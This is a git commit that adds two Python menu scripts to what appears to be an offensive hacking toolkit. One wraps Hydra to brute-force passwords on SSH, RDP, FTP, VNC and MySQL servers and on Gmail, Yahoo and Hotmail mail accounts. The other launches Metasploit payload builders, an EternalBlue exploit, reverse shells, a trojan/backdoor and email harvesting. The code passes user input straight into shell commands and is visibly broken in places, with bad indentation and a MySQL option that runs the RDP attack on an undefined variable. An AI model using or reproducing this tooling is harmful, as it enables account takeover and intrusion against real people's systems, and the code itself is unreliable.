197e218483c0c32e73437e0264864b485d73f372
Cipher <62390774+ProfessorCipher@users.noreply.github.com>
2020-06-26 12:31:16 +0530

    Add files via upload

---
+++ lib/hydra.py
@@ -0,0 +1,108 @@
+#/bin/env python 
+import os
+import time
+import sys
+print
+print("1.Cisco Brute Force ")
+print("2.VNC Brute Force")
+print("3.FTP Brute Force")
+print ("4.Gmail Brute Force")
+print("5.SSH Brute Force")
+print("6.TeamSpeak Brute Force")
+print("7.Telnet Brute Force")
+print("8.Yahoo Mail Brute Force")
+print("9.Hotmail Brute Force")
+print("10.Router Speedy Brute Force ")
+print("11.RDP Brute Force")
+print("12.MySQL Brute Force")
+print
+h = input("Hydra~> ")
+if h == '1':
+	i = input("Enter IP :")
+	j = input("Wordlist :")
+	os.system("hydra -P %s %s cisco" % (j, i))
+	os.system("python hydra.py")
+	time.sleep(5)
+elif h == '2':
+  i = input("Enter IP :")
+  j = input("Wordlist :")
+  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (j, i))
+  os.system("python hydra.py")
+  time.sleep(5)
+elif h == '3':
+ u = input("User :")
+ i = input("Enter IP :")
+ j = input("Wordlist :")
+ os.system("hydra -l %s -P %s %s ftp" % (u, j, i))
+ os.system("python hydra.py")
+ time.sleep(5)
+elif h == '4':
+	e = input("Email :")
+	j = input("Wordlist :")
+    os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (e, j))
+    os.system("python hydra.py")
+    time.sleep(5)
+elif h == '5':
+  u = input("User :")
+  i = input("IP :")
+  j = input("Wordlist :")
+  os.system("hydra -l %s -P %s %s ssh" % (u,j, i))
+  time.sleep(5)
+elif h == '6':
+  u = input("User :")
+  i = input("IP :")
+  j = input("Wordlist :")
+  os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (u, j, i))
+  time.sleep(5)
+elif h == '7':
+	u = input("User :")
+	i = input("IP :")
+	j = input("Wordlist :")
+	os.system("hydra -l %s -P %s %s telnet" % (u, j, i))
+	time.sleep(5)
+elif h == '8':
+	e = input("Email :")
+	j = input("Wordlist :")
+	os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (e, j))
+	time.sleep(5)
+elif h == '9':
+	e = input("Email :")
+	j = input("Wordlist :")
+	os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (e, j))
+	time.sleep(5)
+elif h == '10':
+	u = input("User :")
+	i = input("Email :")
+	j = input("Wordlist :")
+	os.system("hydra -m / -l %s -P %s %s http-get" % (u, j, i))
+	time.sleep(5)
+elif h == '11':
+	u = input("User :")
+	i = input("Email :")
+	j = input("Wordlist :")
+	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
+	time.sleep(5)
+elif h == '12':
+	u = input("User :")
+	j = input("'Wordlist :")
+	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
+	time.sleep(5)
+elif h == 'back':
+	os.system("python pearl.py")
+elif h == 'help':
+	print(""" This is an powerful bruteforcing tool called hydra.select any desired tool and bruteforce it using any wordlist (ex : example.txt).
+	""")
+	os.system("python hydra.py")
+else:
+	sys.exit(1)
+	
+	
+
+	
+
+
+	
+	
+  
+  
+ 
---
+++ lib/msf.py
@@ -0,0 +1,75 @@
+#!/bin/env python
+import os
+import sys
+import time
+R = '\033[91m'
+G = '\033[92m'
+B = '\033[94m'
+C = '\033[96m'
+W = '\033[97m'
+Y = '\033[93m'
+M = '\033[95m'
+G = '\033[90m'
+B = '\033[90m'
+D = '\033[99m'
+print
+print("""
+1.nmap \n 2.msf
+""")
+print("1.Install Metasploit Framework")
+print("2.metasploit framework version")
+print("3.Windows --> test.exe (payload and listener) ")
+print("4.Android --> test.apk (payload and listener)")
+print("5.Linux --> test.py (payload and listener)")
+print("6.MacOS --> test.jar (payload and listener)")
+print("7.Web --> test.php (payload and listener)")
+print("8.Scan if a target is vulnerable to ms17_010")
+print("9.Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)")
+print("10.Exploit Windows with a link (HTA Server)")
+print("11.Simple TCP shell for PHP")
+print("12.Simple TCP shell for ASP")
+print("13.Simple TCP shell for javascript")
+print("14.Simple TCP shell for WAR")
+print("15.Trojan/backdoor for windows xp/7")
+print("16.Harvest emails using msf")
+print
+print
+i = input(G + "msf~>")
+if i == '1':
+	print("Installing Metasploit Framework")
+	os.system("pkg install metasploit")
+    print("Metasploit Framework Installed")
+	os.system("cd lib;python msf.py")
+elif i == '2':
+	os.system("")
+elif i == '3':
+	os.system("cd module;bash windows.sh")
+elif i == '4':
+	os.system("cd module;bash android.sh")
+elif i == '5':
+	os.system("cd module;bash python.sh")
+elif i == '6':
+	os.system("cd module;bash jar.sh")
+elif i == '7':
+	os.system("cd module;bash php.sh")
+elif i == '8':
+	os.system("cd module;bash ms17.sh")
+elif i == '9':
+	os.system("cd module;smb.bash ")
+elif i == '10':
+	os.system("cd module;bash hta.sh")
+elif i == '11':
+	os.system("cd module;bash tp.sh")
+elif i == '12':
+	os.system("cd module;bash asp.sh")
+elif i == '13':
+	os.system("cd module;bash jsp.sh")
+elif i == '14':
+	os.system("cd module;bash war.sh")
+elif i == '15':
+	os.system("cd module;bash trojan.sh")
+elif i == '16':
+	os.system("cd module;bash email.sh")
+elif i == 'back':
+	os.system("cd ~/Blackpearl-framework;python pearl.py")
+																		
